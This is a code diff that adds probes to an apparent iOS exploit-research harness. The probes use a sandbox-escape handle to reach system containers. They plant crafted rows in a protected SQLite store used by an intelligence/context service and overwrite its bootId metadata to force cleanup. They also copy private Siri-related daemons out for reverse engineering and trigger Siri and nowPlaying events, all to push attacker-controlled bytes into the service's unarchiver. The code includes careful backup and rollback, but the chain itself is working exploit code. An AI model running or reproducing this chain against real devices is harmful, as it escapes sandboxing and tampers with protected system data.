+        if (stat(f.fileSystemRepresentation, &fs2) != 0) continue;
+        NSString *dst = [bdir stringByAppendingPathComponent:
+            f.lastPathComponent];
+        if (!bq18_copy(f, dst) || !bq18_same(f, dst)) backupOK = NO;
+    }
+    LOG("[bq28] BACKUP %s", backupOK ? "verified" : "BROKEN");
+    fsync(fileno(stderr));
+    if (!backupOK) {
+        LOG("[bq28] no verified backup — refusing to write");
+        if (tokTgt >= 0) notify_cancel(tokTgt);
+        if (tokOwn >= 0) notify_cancel(tokOwn);
+        bad_query_release(h); LOG("[bq28] done"); return;
+    }
+
+    sqlite3 *wdb = NULL;
+    if (sqlite3_open_v2(dbp.UTF8String, &wdb, SQLITE_OPEN_READWRITE,
+                        NULL) != SQLITE_OK) {
+        LOG("[bq28] WRITE open failed (%s)", wdb ? sqlite3_errmsg(wdb) : "?");
+        if (wdb) sqlite3_close(wdb);
+        if (tokTgt >= 0) notify_cancel(tokTgt);
+        if (tokOwn >= 0) notify_cancel(tokOwn);
+        bad_query_release(h); LOG("[bq28] done"); return;
+    }
+    NSMutableArray *entCols = [NSMutableArray array];
+    sqlite3_stmt *ti = NULL;
+    if (sqlite3_prepare_v2(wdb, "PRAGMA table_info(feedEntries)", -1, &ti,
+                           NULL) == SQLITE_OK)
+        while (sqlite3_step(ti) == SQLITE_ROW)
+            [entCols addObject:[NSString stringWithUTF8String:
+                (const char *)sqlite3_column_text(ti, 1)]];
+    if (ti) sqlite3_finalize(ti);
+    if (entCols.count == 0) {
+        LOG("[bq28] schema unreadable — aborting");
+        sqlite3_close(wdb);
+        if (tokTgt >= 0) notify_cancel(tokTgt);
+        if (tokOwn >= 0) notify_cancel(tokOwn);
+        bad_query_release(h); LOG("[bq28] done"); return;
+    }
+    NSString *(^valFor)(NSString *, NSString *, NSString *) =
+        ^NSString *(NSString *col, NSString *feed, NSString *boot) {
+        if ([col isEqualToString:@"feedId"])    return feed;
+        if ([col isEqualToString:@"bootId"])    return boot;
+        if ([col isEqualToString:@"bundleId"])  return @"com.fz29.probe";
+        if ([col hasPrefix:@"entity"] || [col hasPrefix:@"Entity"])
+            return @"FZ29Oracle/fz29";
+        if ([col isEqualToString:@"lastUpdate"])
+            return @"2099-01-01T00:00:00.000";
+        if ([col isEqualToString:@"lnValue"])   return @"fz29-oracle";
+        if ([col isEqualToString:@"metadata"])  return nil;
+        return @"fz29";
+    };
+    NSMutableString *cols = [NSMutableString string];
+    for (NSString *c in entCols)
+        [cols appendFormat:@"%@%@", cols.length ? @"," : @"", c];
+    NSString *(^insSQL)(NSString *, NSString *) =
+        ^NSString *(NSString *feed, NSString *boot) {
+        NSMutableString *vals = [NSMutableString string];
+        for (NSString *c in entCols) {
+            NSString *v = valFor(c, feed, boot);
+            [vals appendFormat:@"%@%@", vals.length ? @"," : @"",
+                v ? [NSString stringWithFormat:@"'%@'", v] : @"NULL"];
+        }
+        return [NSString stringWithFormat:
+            @"INSERT INTO feedEntries (%@) VALUES (%@)", cols, vals];
+    };
+    char *err = NULL;
+    int changed = 0;
+    sqlite3_exec(wdb, "BEGIN IMMEDIATE", NULL, NULL, NULL);
+    int rc1 = sqlite3_exec(wdb,
+        insSQL(@"fz29.noboot", @"FZ29-NOBOOT-ORACLE").UTF8String,
+        NULL, NULL, &err);
+    int rc2 = rc1 == SQLITE_OK
+        ? sqlite3_exec(wdb,
+            insSQL(@"fz29.bootok", realBoot).UTF8String, NULL, NULL, &err)
+        : rc1;
+    if (rc2 == SQLITE_OK) changed = 1;
+    else LOG("[bq28] WRITE rc=%d: %s", rc2, err ?: "?");
+    if (err) { sqlite3_free(err); err = NULL; }
+    if (!changed) {
+        sqlite3_exec(wdb, "ROLLBACK", NULL, NULL, NULL);
+        LOG("[bq28] WRITE rolled back");
+    } else {
+        sqlite3_exec(wdb, "COMMIT", NULL, NULL, NULL);
+        LOG("[bq28] WRITE committed: oracle+control in place");
+    }
+    fsync(fileno(stderr));
+
+    // ---- probe 3: post the target while markers are in place, watch
+    int postRc[3] = { -99, -99, -99 };
+    int fileChanges = 0, oracleGone = -1, ctrlGone = -1, tgtSignals = 0;
+    struct stat pDb = {0}, pWal = {0};
+    stat(dbp.fileSystemRepresentation, &pDb);
+    stat(walp.fileSystemRepresentation, &pWal);
+    if (changed) {
+        for (int t = 0; t < 90; t++) {
+            if (t == 0 || t == 10 || t == 20) {
+                postRc[t / 10] = notify_post(target);
+                LOG("[bq28] t=%ds POST target -> rc=%d", t, postRc[t / 10]);
+                fsync(fileno(stderr));
+            }
+            usleep(1000 * 1000);
+            if (tokTgt >= 0) {
+                int c = -1;
+                notify_check(tokTgt, &c);
+                if (c == 1) {
+                    tgtSignals++;
+                    LOG("[bq28] t=%ds TARGET NOTIFY FIRED "
+                        "(producer wrote / reader woken)", t);
+                    fsync(fileno(stderr));
+                }
+            }
+            struct stat cdb = {0}, cwal = {0};
+            BOOL any = NO;
+            if (stat(dbp.fileSystemRepresentation, &cdb) == 0 &&
+                (cdb.st_mtime != pDb.st_mtime || cdb.st_size != pDb.st_size)) {
+                LOG("[bq28] t=%ds DB changed: %lld/%lld -> %lld/%lld", t,
+                    (long long)pDb.st_mtime, (long long)pDb.st_size,
+                    (long long)cdb.st_mtime, (long long)cdb.st_size);
+                pDb = cdb; any = YES;
+            }
+            if (stat(walp.fileSystemRepresentation, &cwal) == 0 &&
+                (cwal.st_mtime != pWal.st_mtime || cwal.st_size != pWal.st_size)) {
+                LOG("[bq28] t=%ds WAL changed: %lld/%lld -> %lld/%lld", t,
+                    (long long)pWal.st_mtime, (long long)pWal.st_size,
+                    (long long)cwal.st_mtime, (long long)cwal.st_size);
+                pWal = cwal; any = YES;
+            }
+            if (any) fileChanges++;
+            int o = bq18_count(wdb, "SELECT count(*) FROM feedEntries "
+                                    "WHERE feedId='fz29.noboot'");
+            int c = bq18_count(wdb, "SELECT count(*) FROM feedEntries "
+                                    "WHERE feedId='fz29.bootok'");
+            if (o == 0 && oracleGone < 0) {
+                oracleGone = t;
+                LOG("[bq28] t=%ds ORACLE ROW DELETED — reader ran the "
+                    "bootId cleanup over our rows!", t);
+            }
+            if (c == 0 && ctrlGone < 0) {
+                ctrlGone = t;
+                LOG("[bq28] t=%ds CONTROL ROW GONE — table reset!", t);
+            }
+            if (any || o == 0 || c == 0) fsync(fileno(stderr));
+        }
+    }
+
+    // ---- rollback (bq27)
+    int quiet = 0;
+    for (int i = 0; i < 10 && quiet < 3; i++) {
+        struct stat a = {0}, b2 = {0};
+        stat(dbp.fileSystemRepresentation, &a);
+        usleep(1000 * 1000);
+        stat(dbp.fileSystemRepresentation, &b2);
+        quiet = (a.st_mtime == b2.st_mtime && a.st_size == b2.st_size)
+            ? quiet + 1 : 0;
+    }
+    if (changed) {
+        sqlite3_exec(wdb, "DELETE FROM feedEntries WHERE feedId IN "
+                     "('fz29.noboot','fz29.bootok')", NULL, NULL, NULL);
+        sqlite3_exec(wdb, "COMMIT", NULL, NULL, NULL);
+    }
+    sqlite3_close(wdb);
+    BOOL bytesBack = YES;
+    for (NSString *f in files) {
+        struct stat fs2;
+        if (stat(f.fileSystemRepresentation, &fs2) != 0) continue;
+        NSString *bak = [bdir stringByAppendingPathComponent:
+            f.lastPathComponent];
+        if (!bq18_same(f, bak) && !bq18_copy(bak, f)) bytesBack = NO;
+    }
+    int ent1 = -1, meta1 = -1;
+    sqlite3 *vdb = NULL;
+    if (sqlite3_open_v2(dbp.UTF8String, &vdb, SQLITE_OPEN_READONLY,
+                        NULL) == SQLITE_OK) {
+        ent1 = bq18_count(vdb, "SELECT count(*) FROM feedEntries");
+        meta1 = bq18_count(vdb, "SELECT count(*) FROM feedMetadata");
+        sqlite3_close(vdb);
+    }
+    bytesBack = bytesBack &&
+        bq18_same(dbp, [bdir stringByAppendingPathComponent:@"db"]);
+    LOG("[bq28] VERIFY rows back: %d/%d %d/%d bytes-identical=%d",
+        ent0, ent1, meta0, meta1, bytesBack ? 1 : 0);
+
+    const char *verdict;
+    if (postRc[0] != 0)
+        verdict = "POST DENIED — route closed (rc above)";
+    else if (oracleGone >= 0)
+        verdict = "POSITIVE: post accepted AND reader cleanup observed";
+    else if (fileChanges > 0)
+        verdict = "post accepted, store reacted (writes) — reader wake "
+                  "not directly observable";
+    else
+        verdict = "post accepted, no observable reaction in 90 s "
+                  "(wake not provable, not refuted)";
+    LOG("[bq28] VERDICT: %s (posts=%d/%d/%d signals=%d changes=%d)",
+        verdict, postRc[0], postRc[1], postRc[2], tgtSignals, fileChanges);
+
+    if (tokTgt >= 0) notify_cancel(tokTgt);
+    if (tokOwn >= 0) notify_cancel(tokOwn);
+    bad_query_release(h);
+    LOG("[bq28] done");
+}
+
+// ---------------------------------------------------------------------------
+// V177 (p_bq29): dump the CALLERS (who asks contextd to build context).
+//
+// The read chain's last unknown is who makes a reader fetch
+// ReaderActor.state (only then does the service's NSKeyedUnarchiver
+// touch a planted lnValue — §185). The process list (devicectl, the
+// host side) showed the probable callers are NOT in /usr/libexec at
+// all:
+//   knowledgeconstructiond -> /System/Library/PrivateFrameworks/
+//                             IntelligencePlatformCore.framework/
+//   suggestd               -> /System/Library/PrivateFrameworks/
+//                             CoreSuggestions.framework/
+//   assistantd             -> /System/Library/PrivateFrameworks/
+//                             AssistantServices.framework/
+// all readable from the sandbox (bq22 walks the same root). Offline
+// strings on them will answer: who references entity-feeds /
+// LiveEntityService / the contextd MachServices (com.apple
+// .intelligenceflow.context*).
+//
+// Controls: §170 escape handle; per-file byte-identical read-back
+// (bq20); size logged so a truncated dump cannot pass as evidence.
+// ---------------------------------------------------------------------------
+
+static void p_bq29(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq29] v177 export caller binaries for offline RE");
+
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq29] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { LOG("[bq29] done"); return; }
+
+    NSDictionary *copies = @{
+        @"caller-knowledgeconstructiond.bin":
+            @"/System/Library/PrivateFrameworks/"
+             "IntelligencePlatformCore.framework/knowledgeconstructiond",
+        @"caller-suggestd.bin":
+            @"/System/Library/PrivateFrameworks/"
+             "CoreSuggestions.framework/suggestd",
+        @"caller-assistantd.bin":
+            @"/System/Library/PrivateFrameworks/"
+             "AssistantServices.framework/assistantd",
+    };
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+    for (NSString *name in copies) {
+        NSString *src = copies[name];
+        struct stat st;
+        if (stat(src.fileSystemRepresentation, &st) != 0) {
+            LOG("[bq29] %s: stat errno %d — missing", name.UTF8String, errno);
+            continue;
+        }
+        NSString *dst = [docs stringByAppendingPathComponent:name];
+        int in = open(src.fileSystemRepresentation, O_RDONLY);
+        int out = open(dst.fileSystemRepresentation,
+                       O_WRONLY | O_CREAT | O_TRUNC, 0644);
+        if (in < 0 || out < 0) {
+            LOG("[bq29] %s: open failed (in=%d out=%d errno %d)",
+                name.UTF8String, in, out, errno);
+            if (in >= 0) close(in);
+            if (out >= 0) close(out);
+            continue;
+        }
+        char buf[65536];
+        ssize_t n;
+        while ((n = read(in, buf, sizeof(buf))) > 0)
+            if (write(out, buf, n) != n) break;
+        fsync(out);
+        close(in); close(out);
+        NSData *a = [NSData dataWithContentsOfFile:src];
+        NSData *b = [NSData dataWithContentsOfFile:dst];
+        LOG("[bq29] %s: %lld bytes, byte-identical=%d",
+            name.UTF8String, (long long)st.st_size,
+            (a && b && [a isEqualToData:b]) ? 1 : 0);
+        fsync(fileno(stderr));
+    }
+
+    bad_query_release(h);
+    LOG("[bq29] done");
+}
+
+// ---------------------------------------------------------------------------
+// V177 (p_bq30): arm the cleanup and hand the window to a Siri query.
+//
+// What the strings now establish (svc.bin, bq20 dump):
+//   - "Unexpected row format in feedEntries table" / "Found nil when
+//     unarchiving LNValue" sit NEXT TO the row-select SQL and svc
+//     carries _OBJC_CLASS_$_LNValue — the service unarchives
+//     feedEntries.lnValue itself while iterating rows (read path),
+//     so planted bytes reach its NSKeyedUnarchiver when a reader
+//     fetches state;
+//   - assistantd is a sanctioned client of
+//     com.apple.intelligenceflow.context (its entitlements contain
+//     the name) and the context runtime links LiveEntitySupport —
+//     Siri queries are the real read trigger;
+//   - cleanup ("...RE bootId=?") is keyed by bootId stored in
+//     feedMetadata (string: "SELECT feedId, lastUpdate FROM
+//     feedMetadata" nearby) — same-boot opens would never run it,
+//     which is exactly why bq23/27/28 saw nothing.
+//
+// So this phase ARMS it: set feedMetadata's bootId (if the column
+// exists) to a foreign value, plant oracle+control rows, and let the
+// operator ask Siri questions. The next store touch by the service
+// should see "stale boot", run the cleanup, delete the oracle row
+// (live rows carry the real bootId and survive) and rewrite the
+// metadata — all observable, all rolled back byte-exact afterwards.
+//
+// Controls (§144): escape handle; schema column checked before the
+// UPDATE (never UPDATE a guessed column); verified byte-backup;
+// INSERT/UPDATE failure => ROLLBACK; real bootId read from data;
+// quiet-wait before restore; final byte-identical check; three
+// notify posts (bq26/bq28 proved post rc=0) as an extra nudge for
+// the reader.
+// ---------------------------------------------------------------------------
+
+static void p_bq30(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    int secs = getenv("FUZZ_BQ30_SECS") ? atoi(getenv("FUZZ_BQ30_SECS")) : 180;
+    if (secs < 10) secs = 10;
+    LOG("[bq30] v177 arm cleanup + Siri window, %d s", secs);
+
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq30] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { LOG("[bq30] done"); return; }
+
+    NSString *dir = @"/var/containers/Data/System/"
+        "8EB68272-6502-49E9-B688-25CA4774CFE4";
+    NSString *dbp = [dir stringByAppendingPathComponent:@"db"];
+    NSString *walp = [dbp stringByAppendingString:@"-wal"];
+    NSString *shmPath = [dbp stringByAppendingString:@"-shm"];
+    NSArray *files = @[ dbp, walp, shmPath ];
+    struct stat st = {0};
+    if (stat(dbp.fileSystemRepresentation, &st) != 0) {
+        LOG("[bq30] CONTROL db stat errno %d — target gone", errno);
+        bad_query_release(h); LOG("[bq30] done"); return;
+    }
+    sqlite3 *db = NULL;
+    if (sqlite3_open_v2(dbp.UTF8String, &db, SQLITE_OPEN_READONLY,
+                        NULL) != SQLITE_OK) {
+        LOG("[bq30] CONTROL readonly open failed — aborting");
+        if (db) sqlite3_close(db);
+        bad_query_release(h); LOG("[bq30] done"); return;
+    }
+    int ent0 = bq18_count(db, "SELECT count(*) FROM feedEntries");
+    int meta0 = bq18_count(db, "SELECT count(*) FROM feedMetadata");
+    NSString *realBoot = nil;
+    sqlite3_stmt *q = NULL;
+    if (sqlite3_prepare_v2(db,
+            "SELECT bootId FROM feedEntries "
+            "WHERE bootId NOT LIKE 'FZ29%' LIMIT 1", -1, &q, NULL)
+            == SQLITE_OK && sqlite3_step(q) == SQLITE_ROW) {
+        const char *b = (const char *)sqlite3_column_text(q, 0);
+        if (b) realBoot = [NSString stringWithUTF8String:b];
+    }
+    if (q) sqlite3_finalize(q);
+    // feedMetadata schema first — the arming UPDATE must target a
+    // column that exists, not a remembered guess.
+    NSMutableArray *mdCols = [NSMutableArray array];
+    sqlite3_stmt *tm = NULL;
+    if (sqlite3_prepare_v2(db, "PRAGMA table_info(feedMetadata)", -1, &tm,
+                           NULL) == SQLITE_OK)
+        while (sqlite3_step(tm) == SQLITE_ROW)
+            [mdCols addObject:[NSString stringWithUTF8String:
+                (const char *)sqlite3_column_text(tm, 1)]];
+    if (tm) sqlite3_finalize(tm);
+    LOG("[bq30] CONTROL rows: feedEntries=%d feedMetadata=%d realBootId=%s "
+        "mdCols=%s", ent0, meta0, realBoot ? realBoot.UTF8String : "(none!)",
+        [[mdCols componentsJoinedByString:@","] UTF8String]);
+    fsync(fileno(stderr));
+    sqlite3_close(db);
+    if (ent0 < 0 || meta0 < 0 || !realBoot) {
+        LOG("[bq30] CONTROL incomplete — no blind INSERT");
+        bad_query_release(h); LOG("[bq30] done"); return;
+    }
+
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+    NSString *bdir = [docs stringByAppendingPathComponent:@"bq30-backup"];
+    [[NSFileManager defaultManager] removeItemAtPath:bdir error:NULL];
+    [[NSFileManager defaultManager] createDirectoryAtPath:bdir
+        withIntermediateDirectories:YES attributes:nil error:NULL];
+    BOOL backupOK = YES;
+    for (NSString *f in files) {
+        struct stat fs2;
+        if (stat(f.fileSystemRepresentation, &fs2) != 0) continue;
+        NSString *dst = [bdir stringByAppendingPathComponent:
+            f.lastPathComponent];
+        if (!bq18_copy(f, dst) || !bq18_same(f, dst)) backupOK = NO;
+    }
+    LOG("[bq30] BACKUP %s", backupOK ? "verified" : "BROKEN");
+    fsync(fileno(stderr));
+    if (!backupOK) {
+        LOG("[bq30] no verified backup — refusing to write");
+        bad_query_release(h); LOG("[bq30] done"); return;
+    }
+
+    sqlite3 *wdb = NULL;
+    if (sqlite3_open_v2(dbp.UTF8String, &wdb, SQLITE_OPEN_READWRITE,
+                        NULL) != SQLITE_OK) {
+        LOG("[bq30] WRITE open failed (%s)", wdb ? sqlite3_errmsg(wdb) : "?");
+        if (wdb) sqlite3_close(wdb);
+        bad_query_release(h); LOG("[bq30] done"); return;
+    }
+    NSMutableArray *entCols = [NSMutableArray array];
+    sqlite3_stmt *ti = NULL;
+    if (sqlite3_prepare_v2(wdb, "PRAGMA table_info(feedEntries)", -1, &ti,
+                           NULL) == SQLITE_OK)
+        while (sqlite3_step(ti) == SQLITE_ROW)
+            [entCols addObject:[NSString stringWithUTF8String:
+                (const char *)sqlite3_column_text(ti, 1)]];
+    if (ti) sqlite3_finalize(ti);
+    if (entCols.count == 0) {
+        LOG("[bq30] schema unreadable — aborting");
+        sqlite3_close(wdb);
+        bad_query_release(h); LOG("[bq30] done"); return;
+    }
+    NSString *(^valFor)(NSString *, NSString *, NSString *) =
+        ^NSString *(NSString *col, NSString *feed, NSString *boot) {
+        if ([col isEqualToString:@"feedId"])    return feed;
+        if ([col isEqualToString:@"bootId"])    return boot;
+        if ([col isEqualToString:@"bundleId"])  return @"com.fz29.probe";
+        if ([col hasPrefix:@"entity"] || [col hasPrefix:@"Entity"])
+            return @"FZ29Oracle/fz29";
+        if ([col isEqualToString:@"lastUpdate"])
+            return @"2099-01-01T00:00:00.000";
+        if ([col isEqualToString:@"lnValue"])   return @"fz29-oracle";
+        if ([col isEqualToString:@"metadata"])  return nil;
+        return @"fz29";
+    };
+    NSMutableString *cols = [NSMutableString string];
+    for (NSString *c in entCols)
+        [cols appendFormat:@"%@%@", cols.length ? @"," : @"", c];
+    NSString *(^insSQL)(NSString *, NSString *) =
+        ^NSString *(NSString *feed, NSString *boot) {
+        NSMutableString *vals = [NSMutableString string];
+        for (NSString *c in entCols) {
+            NSString *v = valFor(c, feed, boot);
+            [vals appendFormat:@"%@%@", vals.length ? @"," : @"",
+                v ? [NSString stringWithFormat:@"'%@'", v] : @"NULL"];
+        }
+        return [NSString stringWithFormat:
+            @"INSERT INTO feedEntries (%@) VALUES (%@)", cols, vals];
+    };
+    char *err = NULL;
+    int changed = 0, armed = 0;
+    sqlite3_exec(wdb, "BEGIN IMMEDIATE", NULL, NULL, NULL);
+    int rc1 = sqlite3_exec(wdb,
+        insSQL(@"fz29.noboot", @"FZ29-NOBOOT-ORACLE").UTF8String,
+        NULL, NULL, &err);
+    int rc2 = rc1 == SQLITE_OK
+        ? sqlite3_exec(wdb,
+            insSQL(@"fz29.bootok", realBoot).UTF8String, NULL, NULL, &err)
+        : rc1;
+    if (rc2 == SQLITE_OK) changed = 1;
+    else LOG("[bq30] WRITE rc=%d: %s", rc2, err ?: "?");
+    if (err) { sqlite3_free(err); err = NULL; }
+    // Arm: if feedMetadata tracks the session bootId, overwrite it —
+    // the service will read "stale" on its next open and run cleanup.
+    if (changed && [mdCols containsObject:@"bootId"]) {
+        int ra = sqlite3_exec(wdb,
+            "UPDATE feedMetadata SET bootId='FZ29-ARMED-BOOT'", NULL, NULL,
+            &err);
+        if (ra == SQLITE_OK) armed = 1;
+        else LOG("[bq30] ARM rc=%d: %s", ra, err ?: "?");
+        if (err) { sqlite3_free(err); err = NULL; }
+    } else if (changed) {
+        LOG("[bq30] ARM skipped: no bootId column in feedMetadata");
+    }
+    if (!changed) {
+        sqlite3_exec(wdb, "ROLLBACK", NULL, NULL, NULL);
+        LOG("[bq30] WRITE rolled back");
+    } else {
+        sqlite3_exec(wdb, "COMMIT", NULL, NULL, NULL);
+        LOG("[bq30] WRITE committed: oracle+control in place, armed=%d "
+            "(ask Siri NOW)", armed);
+    }
+    fsync(fileno(stderr));
+
+    int fileChanges = 0, oracleGone = -1, ctrlGone = -1, mdSeen = -1;
+    struct stat pDb = {0}, pWal = {0};
+    stat(dbp.fileSystemRepresentation, &pDb);
+    stat(walp.fileSystemRepresentation, &pWal);
+    if (changed) {
+        dispatch_async(dispatch_get_main_queue(), ^{
+            [UIApplication sharedApplication].idleTimerDisabled = YES;
+        });
+        for (int t = 0; t < secs; t++) {
+            if (t == 0 || t == 30 || t == 60) {
+                int rc = notify_post(
+                    "com.apple.intelligencecontextd.entity-feeds-updated");
+                LOG("[bq30] t=%ds nudge post rc=%d", t, rc);
+                fsync(fileno(stderr));
+            }
+            usleep(1000 * 1000);
+            if (t > 0 && t % 60 == 0) {
+                LOG("[bq30] heartbeat t=%ds changes=%d oracle=%s control=%s",
+                    t, fileChanges, oracleGone < 0 ? "alive" : "GONE",
+                    ctrlGone < 0 ? "alive" : "GONE");
+                fsync(fileno(stderr));
+            }
+            struct stat cdb = {0}, cwal = {0};
+            BOOL any = NO;
+            if (stat(dbp.fileSystemRepresentation, &cdb) == 0 &&
+                (cdb.st_mtime != pDb.st_mtime || cdb.st_size != pDb.st_size)) {
+                LOG("[bq30] t=%ds DB changed: %lld/%lld -> %lld/%lld", t,
+                    (long long)pDb.st_mtime, (long long)pDb.st_size,
+                    (long long)cdb.st_mtime, (long long)cdb.st_size);
+                pDb = cdb; any = YES;
+            }
+            if (stat(walp.fileSystemRepresentation, &cwal) == 0 &&
+                (cwal.st_mtime != pWal.st_mtime || cwal.st_size != pWal.st_size)) {
+                LOG("[bq30] t=%ds WAL changed: %lld/%lld -> %lld/%lld", t,
+                    (long long)pWal.st_mtime, (long long)pWal.st_size,
+                    (long long)cwal.st_mtime, (long long)cwal.st_size);
+                pWal = cwal; any = YES;
+            }
+            if (any) fileChanges++;
+            int o = bq18_count(wdb, "SELECT count(*) FROM feedEntries "
+                                    "WHERE feedId='fz29.noboot'");
+            int c = bq18_count(wdb, "SELECT count(*) FROM feedEntries "
+                                    "WHERE feedId='fz29.bootok'");
+            int armGone = armed
+                ? bq18_count(wdb, "SELECT count(*) FROM feedMetadata "
+                                  "WHERE bootId='FZ29-ARMED-BOOT'") : 1;
+            if (o == 0 && oracleGone < 0) {
+                oracleGone = t;
+                LOG("[bq30] t=%ds ORACLE ROW DELETED — cleanup ran over "
+                    "our rows!", t);
+            }
+            if (c == 0 && ctrlGone < 0) {
+                ctrlGone = t;
+                LOG("[bq30] t=%ds CONTROL ROW GONE — table reset!", t);
+            }
+            if (armed && armGone == 0 && mdSeen < 0) {
+                mdSeen = t;
+                LOG("[bq30] t=%ds metadata re-stamped (armed value "
+                    "consumed) — service rewrote metadata", t);
+            }
+            if (any || o == 0 || c == 0) fsync(fileno(stderr));
+        }
+        dispatch_async(dispatch_get_main_queue(), ^{
+            [UIApplication sharedApplication].idleTimerDisabled = NO;
+        });
+    }
+
+    // ---- rollback
+    int quiet = 0;
+    for (int i = 0; i < 10 && quiet < 3; i++) {
+        struct stat a = {0}, b2 = {0};
+        stat(dbp.fileSystemRepresentation, &a);
+        usleep(1000 * 1000);
+        stat(dbp.fileSystemRepresentation, &b2);
+        quiet = (a.st_mtime == b2.st_mtime && a.st_size == b2.st_size)
+            ? quiet + 1 : 0;
+    }
+    if (changed) {
+        sqlite3_exec(wdb, "DELETE FROM feedEntries WHERE feedId IN "
+                     "('fz29.noboot','fz29.bootok')", NULL, NULL, NULL);
+        sqlite3_exec(wdb, "COMMIT", NULL, NULL, NULL);
+    }
+    sqlite3_close(wdb);
+    BOOL bytesBack = YES;
+    for (NSString *f in files) {
+        struct stat fs2;
+        if (stat(f.fileSystemRepresentation, &fs2) != 0) continue;
+        NSString *bak = [bdir stringByAppendingPathComponent:
+            f.lastPathComponent];
+        if (!bq18_same(f, bak) && !bq18_copy(bak, f)) bytesBack = NO;
+    }
+    NSString *jrnl = [dbp stringByAppendingString:@"-journal"];
+    [[NSFileManager defaultManager] removeItemAtPath:jrnl error:NULL];
+    int ent1 = -1, meta1 = -1;
+    sqlite3 *vdb = NULL;
+    if (sqlite3_open_v2(dbp.UTF8String, &vdb, SQLITE_OPEN_READONLY,
+                        NULL) == SQLITE_OK) {
+        ent1 = bq18_count(vdb, "SELECT count(*) FROM feedEntries");
+        meta1 = bq18_count(vdb, "SELECT count(*) FROM feedMetadata");
+        sqlite3_close(vdb);
+    }
+    bytesBack = bytesBack &&
+        bq18_same(dbp, [bdir stringByAppendingPathComponent:@"db"]);
+    LOG("[bq30] VERIFY rows back: %d/%d %d/%d bytes-identical=%d",
+        ent0, ent1, meta0, meta1, bytesBack ? 1 : 0);
+
+    const char *verdict;
+    if (oracleGone >= 0 && ctrlGone < 0)
+        verdict = "POSITIVE: armed cleanup ran over our rows — read/touch "
+                  "observable!";
+    else if (ctrlGone >= 0)
+        verdict = "TABLE RESET (control gone too)";
+    else if (fileChanges > 0)
+        verdict = "store touched (writes above) but cleanup not run";
+    else
+        verdict = "INCONCLUSIVE: no store touch in window (Siri may not "
+                  "have queried context)";
+    LOG("[bq30] VERDICT: %s (changes=%d armed=%d)", verdict, fileChanges,
+        armed);
+
+    bad_query_release(h);
+    LOG("[bq30] done");
+}
+
+// ---------------------------------------------------------------------------
+// V177 (p_bq31): make mediaremoted write ON DEMAND.
+//
+// Every observation window so far (bq18/19/23/24/27/28/30) was quiet
+// because we never produced a REAL producer event: bq23's looping
+// tone had no nowPlaying metadata at all, and mediaremoted's feed
+// entitlements (bq20 codesign: nowPlaying.localPlayingMedia /
+// nowPlaying.localPausedMedia / media.groupingInfo) suggest the
+// feed write fires on nowPlaying STATE with metadata, not on raw
+// samples. The public path apps normally use is
+// MPNowPlayingInfoCenter (MediaPlayer is now linked) — rich
+// nowPlayingInfo + play + pause + resume = three distinct state
+// transitions for mediaremoted to publish.
+//
+// Oracle semantics: svc unarchives lnValue on row iteration and the
+// cleanup SQL is bootId-keyed (svc strings); the oracle row (foreign
+// bootId) dies if the store is opened/iterated by the service after
+// the write. Even if cleanup does not run, the write itself changes
+// db/wal bytes — that alone is the observed producer channel we
+// have never yet triggered ourselves.
+//
+// Controls (§144): escape handle; row counts; verified byte-backup;
+// INSERT failure => ROLLBACK; quiet-wait; byte-identical restore;
+// audio + nowPlaying setup fully logged (a silent setup failure
+// would make the run look like a negative).
+// ---------------------------------------------------------------------------
+
+static void p_bq31(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    int secs = getenv("FUZZ_BQ31_SECS") ? atoi(getenv("FUZZ_BQ31_SECS")) : 90;
+    if (secs < 30) secs = 30;
+    LOG("[bq31] v177 nowPlaying-driven producer write, %d s", secs);
+
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq31] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { LOG("[bq31] done"); return; }
+
+    NSString *dir = @"/var/containers/Data/System/"
+        "8EB68272-6502-49E9-B688-25CA4774CFE4";
+    NSString *dbp = [dir stringByAppendingPathComponent:@"db"];
+    NSString *walp = [dbp stringByAppendingString:@"-wal"];
+    NSString *shmPath = [dbp stringByAppendingString:@"-shm"];
+    NSArray *files = @[ dbp, walp, shmPath ];
+    struct stat st = {0};
+    if (stat(dbp.fileSystemRepresentation, &st) != 0) {
+        LOG("[bq31] CONTROL db stat errno %d — target gone", errno);
+        bad_query_release(h); LOG("[bq31] done"); return;
+    }
+    sqlite3 *db = NULL;
+    if (sqlite3_open_v2(dbp.UTF8String, &db, SQLITE_OPEN_READONLY,
+                        NULL) != SQLITE_OK) {
+        LOG("[bq31] CONTROL readonly open failed — aborting");
+        if (db) sqlite3_close(db);
+        bad_query_release(h); LOG("[bq31] done"); return;
+    }
+    int ent0 = bq18_count(db, "SELECT count(*) FROM feedEntries");
+    int meta0 = bq18_count(db, "SELECT count(*) FROM feedMetadata");
+    NSString *realBoot = nil;
+    sqlite3_stmt *q = NULL;
+    if (sqlite3_prepare_v2(db,
+            "SELECT bootId FROM feedEntries "
+            "WHERE bootId NOT LIKE 'FZ29%' LIMIT 1", -1, &q, NULL)
+            == SQLITE_OK && sqlite3_step(q) == SQLITE_ROW) {
+        const char *b = (const char *)sqlite3_column_text(q, 0);
+        if (b) realBoot = [NSString stringWithUTF8String:b];
+    }
+    if (q) sqlite3_finalize(q);
